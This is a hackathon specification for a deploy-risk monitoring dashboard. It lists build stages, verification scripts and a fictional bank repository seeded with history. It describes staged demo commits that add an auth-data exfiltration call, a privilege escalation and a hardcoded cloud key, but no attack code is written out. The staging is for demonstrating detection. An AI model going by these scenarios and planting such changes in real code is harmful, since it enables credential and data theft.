# Bridge — Production Deploy War Room — Spec

**Project:** Bridge
**Hackathon track:** Vercel Workflow (WDK) — Track 1
**Submission deadline:** ~22 hours from spec authoring (2026-05-01 22:00 UTC start; spec assumes ~2026-05-02 20:00 UTC submission)
**Demo target repo:** `meridian/core-banking` (separate GitHub repo — fictional major bank's core banking platform; the framing of "wires + auth + AML" maximizes the perceived stakes during the live demo. Scaffolded in T0.4, seeded in T6, three scenarios staged in T6.2)

## Source Documents

- **`raw_prompt.md`** — verbal source of truth for behavior, scoring formula, signal definitions, and demo scenario. Use this for HOW the system works.
- **`war-room/`** — Claude Design handoff bundle; pixel-perfect visual source of truth (`War Room.html`, `app.jsx`, `components.jsx`, `data.js`, `styles.css`). Use this for WHAT the UI looks like.
- **`track-info.md`** — hackathon track resources, links, and quick-start commands for WDK.
- **Claude design URL** — `https://api.anthropic.com/v1/design/h/Ry1KGi5XlJWoDA1GfmhpHw` (gated; not directly fetchable; the war-room/ folder is the local mirror).

**Conflict resolution:** When `raw_prompt.md` and `war-room/` disagree, `war-room/` wins for visual specifics; `raw_prompt.md` wins for backend behavior. Recorded conflicts: (1) `war-room/app.jsx` runs all 5 investigator agents in the demo, while raw_prompt §4c says to stub TRACE and RUNTIME — resolved by implementing a `mode` flag (`demo` runs all 5 with synthesized data; `production` shows N/A for trace+runtime). (2) `war-room/components.jsx` shows `acme/control-plane` as a hardcoded crumb — resolved by reading from `MONITORED_REPO` env var with `meridian/core-banking` as the configured value. (3) `war-room/components.jsx` shows a hardcoded `BUDGET 42% remaining` crumb — replaced in T8.1.9 with a live tick-down tied to WDK observability cost telemetry.

## Project Topology

```
bridge/                                   ← THIS repo, deployed to Vercel
├── app/(warroom)/page.tsx                ← single dashboard page
├── app/(warroom)/components/             ← ports of war-room/project/components.jsx
├── app/api/webhooks/github/route.ts      ← receives push events
├── app/api/stream/deploys/route.ts       ← SSE to war room
├── app/api/slack/interactive/route.ts    ← Slack button callback
├── lib/db.ts                             ← KV helpers
├── lib/sse-events.ts                     ← typed event shapes
├── lib/signals/{structural,temporal,behavioral}.ts
├── lib/score.ts
├── lib/file-classifier.ts                ← T7
├── lib/slack.ts
├── lib/critical-paths.ts
├── lib/demo/mock-stream.ts               ← demo-mode fallback
├── lib/cost-meter.ts                     ← T8 budget tick-down via WDK telemetry
├── data/preview-staged.ts                ← T6 pre-demo scenario validation
├── app/(warroom)/components/SuspendedOverlay.tsx  ← T8 WORKFLOW SUSPENDED band
├── app/(warroom)/components/ResumePulse.tsx       ← T8 green border-flash on ack
├── app/(warroom)/components/RiskScoreArc.tsx      ← T8 animated score arc
├── app/(warroom)/hooks/useDeploysSSE.ts  ← T3 SSE hook
├── app/(warroom)/hooks/useTickedNumber.ts ← T8 animated number interpolation
├── app/api/demo/reset/route.ts           ← T8 demo reset API
├── app/api/demo/run/route.ts             ← T8 demo run API
├── scripts/full-demo-rehearsal.sh        ← T8 end-to-end demo test
├── scripts/chaos-drill.sh               ← T8 durability chaos test
├── scripts/preflight.sh                  ← T10 submission preflight
├── workflows/watchdog.ts                 ← top-level "use workflow"
├── workflows/synthesizer.ts              ← DurableAgent
├── workflows/steps/{ingest,extract-signals,score,summarize}.ts
├── workflows/investigators/{history,dependency,diff,trace,runtime}.ts
├── data/seed-history.ts                  ← T6.1 backfill
├── scripts/reset-demo.sh                 ← T6.3 idempotent reset
├── next.config.ts                        ← wraps with withWorkflow
└── package.json

meridian-core-banking/                    ← SEPARATE repo (cloned next to bridge/), the fictional bank's codebase
├── app/(app)/dashboard/page.tsx          ← internal ops dashboard
├── app/api/admin/wire-override/route.ts  ← TARGET of scenario B (privilege escalation)
├── app/api/auth/[...nextauth]/route.ts
├── app/api/wires/initiate/route.ts       ← real wire-transfer endpoint
├── app/api/wires/approve/route.ts        ← dual-control approval flow
├── components/ui/{Button,Card}.tsx       ← dev-3's home turf in seeded history
├── lib/auth.ts                           ← TARGET of scenario A (auth-exfil — the LIVE demo)
├── lib/auth/session.ts
├── lib/auth/permissions.ts               ← RBAC checks; touched by privesc scenario
├── lib/billing/stripe.ts                 ← cards + recurring payments
├── lib/compliance/aml.ts                 ← AML / sanctions screening
├── lib/db/queries.ts
├── lib/observability/emit.ts             ← TARGET of scenario C (hardcoded AKIA leak)
├── lib/wires/transfer.ts                 ← wire instruction builder
├── lib/wires/validate.ts                 ← amount + counterparty checks
├── package.json                          ← Next 15, React 18
└── README.md                             ← "Meridian Bank — Core Banking Platform" (fictional)
```

**Why a bank.** The demo's narrative power is multiplied by the perceived stakes. An exfil endpoint inside `lib/billing/stripe.ts` of a generic SaaS reads as "annoying compliance issue"; an exfil endpoint inside `lib/auth.ts` of a wires API reads as "the bank just got robbed". The framing is free — the code is a few hundred lines of plausible scaffolding either way — but it changes how a judge feels watching the war room go red.

## Demo Authors (seeded into `meridian/core-banking` history)

From `war-room/project/data.js` `authors` array, plus narrative tenure/role per author so the live voiceover has texture. Each author has a "home area" they have committed to in seeded history. **`dev-3` (Devin Ross)** is the demo commit author — joined Meridian 14 days ago, has only touched UI components, has zero history in `lib/auth/*` or `lib/wires/*`. The History Inspector's "novel author" finding is therefore *true*, not theatrical.

| login | display name | tenure | role | home area | uses |
|---|---|---|---|---|---|
| `ana-w` | Ana Whitfield | 4y | Sr. Eng, Reliability | `lib/queue/` | dependability author signal |
| `k-chen` | Kuan Chen | 3y | Staff Eng, Data | `lib/db/` | familiar-author baseline |
| `d-park` | Daria Park | 2y | Eng, Payments | `lib/billing/` | scenario C reviewer (CODEOWNERS) |
| `m-rivera` | Mateo Rivera | 5y | Principal, Observability | `lib/observability/` | scenario C reviewer (CODEOWNERS) |
| `j-singh` | Jaspreet Singh | 6y | Eng Mgr, Admin Tools | `app/api/admin/` | scenario B reviewer (CODEOWNERS) |
| `t-okafor` | Tomi Okafor | 7y | Tech Lead, Identity | `lib/auth/` | scenario A reviewer (CODEOWNERS) — *legit* auth contributor |
| `s-lin` | Sarah Lin | 1y | Eng, Frontend | `components/ui/` | familiar-area baseline |
| `r-gomez` | Rosa Gomez | 8mo | Eng, Internal Tools | `app/(app)/` | familiar-area baseline |
| `dev-3` | **Devin Ross** | **14d** | **Eng (new hire)** | `components/ui/` only | **all 3 scenarios — author of the staged commits** |

**CODEOWNERS file** at `meridian-core-banking/.github/CODEOWNERS`: `lib/auth/* @t-okafor`, `lib/wires/* @t-okafor @ana-w`, `app/api/admin/* @j-singh`, `lib/observability/* @m-rivera`, `lib/billing/* @d-park`. The History Inspector cross-references this; "dev-3 not in CODEOWNERS for the path they touched" is one of the cleanest visible signals.

## Project-Specific Constraints (ABSOLUTE — no exceptions)

| Rule | Reason |
|------|--------|
| Never fake the Slack pause/resume — it must be a real WDK signal/wait round-trip with a real Slack interaction | This IS the WDK durability money shot; faking loses the track |
| Investigator agents must be `DurableAgent` sub-workflows, not regular API handlers | The pitch *is* "durable sub-workflow tree" — bypassing WDK invalidates the submission |
| All LLM calls go through Vercel AI Gateway (model strings like `anthropic/claude-sonnet-4-6`); no raw provider keys | Track requirement + zero key management |
| Demo auto-runs on first paint (3-second calm hold, then play); no required click to start | Judges glance, they don't click |
| War room palette is locked: black background, mono fonts, single accent per state (amber armed / red critical / green clear). No gradients, glassmorphism, rounded-2xl, or shadcn defaults | Aesthetic is a first-class deliverable per the design brief |
| Every live data source must have a mock-data fallback path | If the backend dies mid-demo, the frontend still tells the story |
| The demo commit must trigger cleanly 5+ times in rehearsal before going live | Live demo failure = lost hackathon |

## Verify-Block Conventions

Every stage has 4 tiers. Targets <30s wall time per tier.

- **Tier 1 (Build):** Real toolchain — `npx tsc --noEmit`, `next build`, `actionlint`, `node --check`. Never `test -f`. Never grep for strings.
- **Tier 2 (Simplify):** ~~Dispatch `code-simplifier:code-simplifier` agent on changed files per stage.~~ **REMOVED FROM PER-STAGE VERIFY** per project CLAUDE.md override (83 stages × simplifier-dispatch is too expensive for a hackathon timeline). The simplifier runs **once before each commit** on all files changed since the last commit, per global Task Completion Protocol §3 Step 6. The `# tier2_simplify` blocks remaining in the stages below are **informational** — they document files that would be in scope at simplify-time, but they are not executed during stage verification. Per-stage flow is now: **Tier 1 → Tier 3 → Tier 4**.
- **Tier 3 (Unit):** Inline script that imports the module and asserts on output. NO grep-for-string anti-patterns. For React: SSR with `react-dom/server.renderToString` + assert on output substring. **For TypeScript sources** (`.ts`/`.tsx`), commands run via `npx tsx --input-type=module -e "..."` (not raw `node`), since Node cannot import TypeScript directly. `tsx` is added as a dev dep in T0.2.1.
- **Tier 4 (Integration):** Spin up `next dev` on PORT=3030 (background), curl real endpoint, assert on response, kill server. For workflows: invoke function, assert on KV side effects + SSE stream contents.

**Server lifecycle for Tier 4:** Start once with `next dev -p 3030 > /tmp/bridge-dev.log 2>&1 &`, wait until port 3030 responds (loop on `curl -fsS http://localhost:3030 || sleep 1`, max 30s), run assertions, then `pkill -f 'next dev.*3030'`. Each Tier 4 owns its server lifecycle so stages don't interfere.

**Tier 3 must actually fail on broken code.** Never use `|| echo` or `|| true` to swallow non-zero exits. If a check is genuinely unverifiable in tier3 (e.g., a TSX module can't be imported until tier4's `next build`), state that explicitly and rely on tier4 — do not fake a green tier3.

### Rigor bar (the 200-IQ-senior-hackathon-winner standard)

The fast-path verify blocks above are the *minimum*. Every stage that has a meaningful behavior surface must hit these bars:

**Tier 3 must include all of:**
1. **Happy path.** One canonical positive case where the function returns the expected output.
2. **Negative path.** One case where the function correctly returns no-match / falsy / null without false positive.
3. **Edge cases (≥3 of these, choose what applies):** empty input · whitespace-only input · unicode / emoji input · multi-line input · input with regex metacharacters · case sensitivity · trailing-newline / no-trailing-newline · maximum-size input · input that triggers an early-return short-circuit · null / undefined fields in the input shape.
4. **Adversarial inputs (≥1 where applicable):** template-literal patterns the regex might miss · comments that look like the matched code · base64-encoded versions of secret shapes · zero-width-space tricks · input the function might reject due to a too-greedy regex.
5. **Configuration / parameterization** (where applicable): if the function takes a config (e.g., allowlist, threshold), test it both at the default and at a custom value, with at least one case proving the config actually changes behavior.

**Tier 4 must do at least one of (preferably more):**
1. **Cross-stage integration.** Pull the function INTO the next stage up — e.g., a signal detector's tier4 runs through `extract-signals.ts` and asserts on the aggregated output, not the detector directly.
2. **Real external dependency.** Hit the actual KV / AI Gateway / Slack API / GitHub API. No mocks. Use a sandbox/test resource if available; clean up after.
3. **End-to-end against the running stack.** Curl the real endpoint on the local dev server, verify the SSE stream content, the KV state mutation, AND the UI HTML snapshot all line up.
4. **Failure-mode test (where applicable):** what happens when the dependency fails — KV unreachable, AI Gateway times out, malformed Slack payload? The system should degrade gracefully, not crash.
5. **Idempotence / replay (where applicable):** run the same operation twice; assert the second run does not double-write or duplicate effects.

**Tier 4 must NOT duplicate Tier 3.** If tier 4 is just "more cases of the same unit test", it adds no signal. Different *surface*, not different *quantity*.

**A stage's tests fail the rigor bar** when ANY of: tier3 has fewer than 5 cases · tier3 has only positive cases (no negative) · tier4 only re-runs the same module the unit test exercised · either tier swallows exit codes via `|| echo` / `|| true` (except cleanup lines after `$ec` is captured) · neither tier exercises the full code path under test · tests assert on string presence rather than behavior.

**Where this rigor bar is genuinely impossible** (pure type definitions, docs-only stages, operational checklists), the spec STATES so explicitly per stage. There is no "we'll figure it out later".

---

## T0 — Setup

**Description:** Scaffold the Next.js app, wrap it with the Workflow Development Kit, install all dependencies, provision Vercel KV, deploy a placeholder version, port the war-room/ frontend handoff into Next.js, and create the empty `meridian/core-banking` repo so T1 has a webhook target.

### T0.1 — Next.js + WDK scaffold

**Description:** Create the Next.js project, add the WDK directive, configure withWorkflow, set up the AI Gateway env var.

#### T0.1.1 — Create Next.js project

**Description:** Run `create-next-app` with --no-src-dir --typescript --tailwind --app inside the repo root, producing `bridge/`. Move the contents up one level so the project root IS the Next.js app (or rename strategy that achieves the same). After this stage, `package.json`, `app/`, `tsconfig.json`, `tailwind.config.ts`, `next.config.ts` exist at repo root.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: package.json next.config.ts tsconfig.json tailwind.config.ts app/layout.tsx app/page.tsx"
```

```bash
# tier3_unit
node -e "const p = require('./package.json'); if (!p.dependencies?.next) { console.error('next missing'); process.exit(1); } if (!p.dependencies?.react) { console.error('react missing'); process.exit(1); } console.log('OK ' + p.dependencies.next + ' ' + p.dependencies.react)"
```

```bash
# tier4_integration
npx next build
```

#### T0.1.2 — Add WDK

**Description:** Run `npx workflow@latest`. This adds the `@workflow/ai` package and sets up the workflow directives. After this stage, `node_modules/@workflow/` exists and `workflow` config is added to next.config.ts.

**Requires:** T0.1.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: package.json next.config.ts"
```

```bash
# tier3_unit
node -e "const p = require('./package.json'); const has = (k) => p.dependencies?.[k] || p.devDependencies?.[k]; if (!has('workflow') && !has('@workflow/ai')) { console.error('workflow/wdk dep missing'); process.exit(1); } console.log('OK')"
```

```bash
# tier4_integration
npx next build
```

#### T0.1.3 — Wrap nextConfig with withWorkflow

**Description:** Edit `next.config.ts` to import `withWorkflow` from the WDK and wrap the default export. After this stage, `next build` still passes and the workflow runtime is registered.

**Requires:** T0.1.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: next.config.ts"
```

```bash
# tier3_unit
npx tsx -e "import('./next.config.ts').then(m => { const cfg = m.default || m; if (!cfg || typeof cfg !== 'object') { console.error('next.config.ts does not export a config object'); process.exit(1); } console.log('OK config keys:', Object.keys(cfg).join(', ')); })"
```

```bash
# tier4_integration
npx next build
```

#### T0.1.4 — AI Gateway key + .env.local

**Description:** Get an AI Gateway API key from https://vercel.com/ai-gateway, write it to `.env.local` as `AI_GATEWAY_API_KEY`. Also seed `MONITORED_REPO=meridian/core-banking` (overridden in T6 to point at `meridian/core-banking`). Add `.env.local` to `.gitignore`.

**Requires:** T0.1.3

**Verify:**

```bash
# tier1_build
node -e "const fs = require('fs'); if (!fs.existsSync('.env.local')) { console.error('.env.local missing'); process.exit(1); } const gi = fs.readFileSync('.gitignore','utf8'); if (!/^\\.env\\.local$/m.test(gi)) { console.error('.env.local not in .gitignore'); process.exit(1); } console.log('OK')"
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: .gitignore"
```

```bash
# tier3_unit
node -e "require('dotenv').config({path:'.env.local'}); if (!process.env.AI_GATEWAY_API_KEY || process.env.AI_GATEWAY_API_KEY.length < 10) { console.error('AI_GATEWAY_API_KEY missing or too short'); process.exit(1); } if (!process.env.MONITORED_REPO) { console.error('MONITORED_REPO missing'); process.exit(1); } console.log('OK')"
```

```bash
# tier4_integration
node -e "require('dotenv').config({path:'.env.local'}); const k = process.env.AI_GATEWAY_API_KEY; fetch('https://gateway.ai.vercel.app/v1/chat/completions', { method: 'POST', headers: { 'Authorization': 'Bearer ' + k, 'Content-Type': 'application/json' }, body: JSON.stringify({ model: 'anthropic/claude-sonnet-4-6', messages: [{ role: 'user', content: 'reply with the single word OK' }], max_tokens: 5 }) }).then(r => r.ok ? console.log('GATEWAY OK ' + r.status) : (console.error('GATEWAY FAIL ' + r.status), process.exit(1))).catch(e => { console.error(e); process.exit(1); })"
```

### T0.2 — Dependencies + KV + Deploy

**Description:** Install runtime dependencies, provision Vercel KV from the dashboard, pull env vars locally, push to GitHub, deploy to Vercel.

#### T0.2.1 — Install runtime deps

**Description:** `npm i @workflow/ai octokit @slack/web-api ai zod dotenv` and `npm i -D tsx`. The `tsx` dev dep is what powers `npx tsx --input-type=module -e "..."` in tier3 commands across the rest of the spec — without it, TS-source imports in tier3 would not work. Confirm node_modules and package-lock.json reflect the additions.

**Requires:** T0.1.4

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: package.json package-lock.json"
```

```bash
# tier3_unit
node -e "const p = require('./package.json'); const need = ['@workflow/ai','octokit','@slack/web-api','ai','zod','dotenv']; const missing = need.filter(d => !p.dependencies?.[d] && !p.devDependencies?.[d]); if (missing.length) { console.error('missing runtime deps:', missing); process.exit(1); } if (!p.devDependencies?.tsx) { console.error('tsx dev dep missing — needed for tier3 in later stages'); process.exit(1); } console.log('OK')"
```

```bash
# tier4_integration
node -e "Promise.all(['@workflow/ai','octokit','@slack/web-api','ai','zod','dotenv'].map(m => import(m).then(() => m).catch(e => { console.error('fail to import',m,e.message); process.exit(1); }))).then(rs => console.log('imported',rs.length))" && npx tsx --version
```

#### T0.2.2 — Provision Vercel KV + pull env

**Description:** Connect Vercel KV from the Vercel dashboard, then `vercel link` and `vercel env pull .env.local` to merge the KV connection vars (`KV_URL`, `KV_REST_API_URL`, `KV_REST_API_TOKEN`, `KV_REST_API_READ_ONLY_TOKEN`) into local env. After this stage, the KV client can connect from local dev.

**Requires:** T0.2.1

**Verify:**

```bash
# tier1_build
node -e "const fs = require('fs'); if (!fs.existsSync('.env.local')) { console.error('.env.local missing'); process.exit(1); } const env = fs.readFileSync('.env.local','utf8'); if (!/^KV_REST_API_URL=/m.test(env)) { console.error('KV_REST_API_URL not set in .env.local'); process.exit(1); } console.log('OK')"
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: .env.local (skip — secret-bearing; verify content shape only)"
```

```bash
# tier3_unit
node -e "require('dotenv').config({path:'.env.local'}); const need = ['KV_URL','KV_REST_API_URL','KV_REST_API_TOKEN']; const missing = need.filter(k => !process.env[k]); if (missing.length) { console.error('missing:', missing); process.exit(1); } console.log('OK')"
```

```bash
# tier4_integration
node -e "require('dotenv').config({path:'.env.local'}); fetch(process.env.KV_REST_API_URL + '/ping', { headers: { Authorization: 'Bearer ' + process.env.KV_REST_API_TOKEN } }).then(r => r.ok ? console.log('KV OK') : (console.error('KV FAIL ' + r.status), process.exit(1))).catch(e => { console.error(e); process.exit(1); })"
```

#### T0.2.3 — Push to GitHub origin

**Description:** Initialize the GitHub remote (`git remote add origin git@github.com:<user>/bridge.git`), push `main`. Confirm the remote shows the latest commit.

**Requires:** T0.2.2

**Verify:**

```bash
# tier1_build
git rev-parse --is-inside-work-tree > /dev/null
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: .gitignore (verify .env.local excluded)"
```

```bash
# tier3_unit
git remote get-url origin > /dev/null && git ls-remote origin HEAD > /dev/null
```

```bash
# tier4_integration
LOCAL=$(git rev-parse HEAD); REMOTE=$(git ls-remote origin main | awk '{print $1}'); if [ "$LOCAL" != "$REMOTE" ]; then echo "local=$LOCAL remote=$REMOTE"; exit 1; fi; echo "OK $LOCAL"
```

#### T0.2.4 — Deploy to Vercel + confirm preview URL

**Description:** Run `vercel --prod` (or use git-integration auto-deploy). Capture the deploy URL into a local file `.deploy-url` for downstream stages to use.

**Requires:** T0.2.3

**Verify:**

```bash
# tier1_build
node -e "const u = require('fs').readFileSync('.deploy-url','utf8').trim(); if (!u.startsWith('https://')) { console.error('deploy URL missing or invalid'); process.exit(1); } console.log('OK ' + u)"
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: .gitignore (verify .deploy-url excluded)"
```

```bash
# tier3_unit
node -e "const u = require('fs').readFileSync('.deploy-url','utf8').trim(); if (!u.startsWith('https://')) { console.error('bad url'); process.exit(1); } console.log('OK ' + u)"
```

```bash
# tier4_integration
URL=$(cat .deploy-url); curl -fsS -o /dev/null -w '%{http_code}\n' "$URL" | grep -E '^(200|301|302)$'
```

### T0.3 — Frontend handoff port (war-room/ → app/(warroom)/)

**Description:** Convert the CDN-React + Babel prototype in `war-room/project/` into Next.js TSX modules under `app/(warroom)/`. Pixel-perfect: matching tokens, layout, animations.

#### T0.3.1 — Port styles.css to globals + Tailwind tokens

**Description:** Move `war-room/project/styles.css` → `app/globals.css`. Import JetBrains Mono + IBM Plex Mono in Tailwind config. Map the `:root` custom properties (--bg, --fg, --amber, --red, --green, --line, etc.) into both globals.css and tailwind.config.ts theme.extend.colors.

**Requires:** T0.2.4

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json && npx next build
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/globals.css tailwind.config.ts"
```

```bash
# tier3_unit
node -e "const css = require('fs').readFileSync('app/globals.css','utf8'); const tokens = { '--amber': /--amber\s*:\s*#[0-9a-fA-F]+/, '--red': /--red\s*:\s*#[0-9a-fA-F]+/, '--green': /--green\s*:\s*#[0-9a-fA-F]+/, '--bg': /--bg\s*:\s*#[0-9a-fA-F]+/, '--fg': /--fg\s*:\s*#[0-9a-fA-F]+/, '--line': /--line\s*:\s*#[0-9a-fA-F]+/ }; const missing = Object.entries(tokens).filter(([,rx]) => !rx.test(css)).map(([k]) => k); if (missing.length) { console.error('CSS custom properties missing or malformed:', missing); process.exit(1); } if (!/font-family[^;]*JetBrains Mono/.test(css)) { console.error('JetBrains Mono not declared in font-family'); process.exit(1); } console.log('OK ' + Object.keys(tokens).length + ' tokens + font validated')"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t031.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && curl -fsS http://localhost:3030 | grep -q 'JetBrains Mono'; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

#### T0.3.2 — Port components.jsx to TSX components

**Description:** Convert each function in `war-room/project/components.jsx` (TopBar, StatusBlock, DeployTimeline, TimelineRow, AgentCard, AgentsPanel, FeedLine, FeedPanel, HeatmapPanel, ThreatPanel, VerdictModal) into individual `.tsx` files under `app/(warroom)/components/`. Add typed props matching the SSE event shapes (placeholder type definitions; final types in T3.1).

**Requires:** T0.3.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/components/*.tsx"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('react-dom/server').then(async ({ renderToString }) => { const React = (await import('react')).default; const mod = await import('./app/(warroom)/components/TopBar.tsx'); const TopBar = mod.TopBar || mod.default; if (!TopBar) { console.error('TopBar export missing'); process.exit(1); } const html = renderToString(React.createElement(TopBar, { activeDeploy: null })); if (!html.includes('BRIDGE')) { console.error('TopBar render missing BRIDGE'); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t032.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && curl -fsS http://localhost:3030 | grep -q 'BRIDGE'; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

#### T0.3.3 — Port app.jsx demo runner to useDemo hook + page.tsx

**Description:** Convert `war-room/project/app.jsx`'s `useDemo` hook into `app/(warroom)/hooks/useDemo.ts` (or as a client component) and `App` shell into `app/(warroom)/page.tsx`. The 25-second `runDemo` orchestration logic is preserved verbatim. Auto-start after 3 seconds on first paint.

**Requires:** T0.3.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json && npx next build
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/hooks/useDemo.ts app/(warroom)/page.tsx"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "const mod = await import('./app/(warroom)/hooks/useDemo.ts'); if (typeof mod.useDemo !== 'function' && typeof mod.default !== 'function') { console.error('useDemo hook not exported as named or default'); process.exit(1); } console.log('OK useDemo exports validated')"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t033.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && curl -fsS http://localhost:3030 | grep -q 'ALL CLEAR'; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

#### T0.3.4 — Demo autoplay loop + countdown chip

**Description:** Make `useDemo` loop indefinitely so a judge landing on the deployed URL at any time sees the full 25-second beat without a click. Behavior:

1. **First play:** auto-start 3s after first paint (already specced in T0.3.3).
2. **Final hold:** at t=25s the demo enters "FINAL STATE" hold for `LOOP_HOLD_MS` (default 8000ms — configurable via env / prop).
3. **Reset + replay:** after the hold, call the existing `reset()` and immediately `runDemo()` again. Loop indefinitely.
4. **Countdown chip:** a small UI affordance bottom-left during the hold: `[ NEXT PLAY · 0:08 ]` with a 1Hz tick down. Disappears once the next play begins. Only visible in `mode='demo'`.
5. **Pause-on-interaction:** if the user clicks RUN DEMO or RESET (T8.1.1) during a hold, cancel the auto-replay timer — they took control. Auto-replay resumes 30s after the user's last interaction.
6. **No loop in `mode='live'`:** loop logic is gated on `mode==='demo'`. Live mode behaves exactly as before — no auto-replay.

Implement in `useDemo` (extend the hook returning a `loopState: 'playing' | 'holding' | 'paused-by-user'` and a `nextPlayInMs: number`) and `app/(warroom)/components/CountdownChip.tsx`.

**Requires:** T0.3.3

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json && npx next build > /tmp/t034.log 2>&1 && grep -q "Compiled successfully" /tmp/t034.log
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/hooks/useDemo.ts app/(warroom)/components/CountdownChip.tsx"
```

```bash
# tier3_unit
# 7 cases: loop state machine (initial → playing → holding → playing) + interaction pause + mode gating + countdown decrement.
npx tsx --input-type=module -e "
import { computeLoopState, computeNextPlayInMs } from './app/(warroom)/hooks/useDemo.ts';

// computeLoopState({ phase: 'playing' | 'holding' | 'paused-by-user', mode })
const cases = [
  { name: 'demo + initial → playing-pending (3s startup)', input: { phase: 'initial', mode: 'demo', sinceMs: 1000 }, expect: 'playing-pending' },
  { name: 'demo + initial → playing once 3s elapsed', input: { phase: 'initial', mode: 'demo', sinceMs: 3500 }, expect: 'playing' },
  { name: 'demo + holding → still holding before 8s', input: { phase: 'holding', mode: 'demo', sinceMs: 4000 }, expect: 'holding' },
  { name: 'demo + holding → playing once hold expired', input: { phase: 'holding', mode: 'demo', sinceMs: 9000 }, expect: 'playing' },
  { name: 'demo + paused-by-user → still paused before 30s', input: { phase: 'paused-by-user', mode: 'demo', sinceMs: 15000 }, expect: 'paused-by-user' },
  { name: 'demo + paused-by-user → resumed-playing once 30s elapsed', input: { phase: 'paused-by-user', mode: 'demo', sinceMs: 31000 }, expect: 'playing' },
  { name: 'live + holding → no replay (live mode does not loop)', input: { phase: 'holding', mode: 'live', sinceMs: 60000 }, expect: 'holding' },
];
for (const c of cases) {
  const got = computeLoopState(c.input);
  if (got !== c.expect) { console.error('FAIL', c.name, 'expected', c.expect, 'got', got); process.exit(1); }
}

// computeNextPlayInMs decrements correctly
const a = computeNextPlayInMs({ phase: 'holding', sinceMs: 0, holdMs: 8000 });
const b = computeNextPlayInMs({ phase: 'holding', sinceMs: 3000, holdMs: 8000 });
const c0 = computeNextPlayInMs({ phase: 'holding', sinceMs: 9000, holdMs: 8000 });
if (a !== 8000 || b !== 5000 || c0 !== 0) { console.error('countdown decrement wrong:', a, b, c0); process.exit(1); }

// Live mode → countdown function returns null (no loop)
const live = computeNextPlayInMs({ phase: 'holding', sinceMs: 0, holdMs: 8000, mode: 'live' });
if (live !== null) { console.error('live mode should return null countdown, got', live); process.exit(1); }

console.log('OK ' + cases.length + ' state-machine cases + countdown decrement + mode gating');
"
```

```bash
# tier4_integration
# E2E: load page in demo mode, wait through one full cycle (25s play + 8s hold + replay), confirm a deploy event appears TWICE in the SSR-streamed history.
(npx next dev -p 3030 > /tmp/dev-t034.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done

# Snapshot 1: just after first paint
sleep 5
curl -fsS http://localhost:3030 | grep -q 'NEXT PLAY\|FINAL STATE\|MONITORING\|CRITICAL\|ALL CLEAR' || { echo "no demo state visible at t=5"; pkill -f 'next dev.*3030'; exit 1; }

# Snapshot 2: after the hold should have started (t > 28s) — countdown chip should be present
sleep 25
SNAP=$(curl -fsS http://localhost:3030)
echo "$SNAP" | grep -q 'NEXT PLAY' || { echo "countdown chip missing during hold phase"; pkill -f 'next dev.*3030'; exit 1; }

# Snapshot 3: after the replay should have started (t > 36s) — should be back into demo flow, NOT in FINAL STATE anymore
sleep 12
SNAP2=$(curl -fsS http://localhost:3030)
echo "$SNAP2" | grep -q 'FINAL STATE' && { echo "still in FINAL STATE — loop did not reset"; pkill -f 'next dev.*3030'; exit 1; }

ec=0; pkill -f 'next dev.*3030' || true
echo "OK demo loop replays after hold"
exit $ec
```

### T0.4 — Demo target repo

#### T0.4.1 — Create empty `meridian/core-banking` repo skeleton

**Description:** Outside this repo, scaffold a sibling Next.js app at `../meridian-core-banking/` with file shapes Bridge will monitor. Files are minimal but real (not empty stubs — each has plausible TypeScript so signal regexes have something to match):

- `lib/auth.ts` — exports `verifySession(req)`, `requireRole(session, role)`, plus an existing `await fetch('https://identity.meridian.internal/...')` to a *legitimate* internal host (so the demo's exfil fetch reads as "an extra one was added", not "the only one")
- `lib/auth/session.ts`, `lib/auth/permissions.ts` — typed session + RBAC stubs
- `lib/wires/transfer.ts` — exports `buildWireInstruction({ from, to, amount, memo })`
- `lib/wires/validate.ts` — exports `validateAmount`, `validateCounterparty`
- `lib/billing/stripe.ts` — Stripe SDK wrapper for cards/recurring
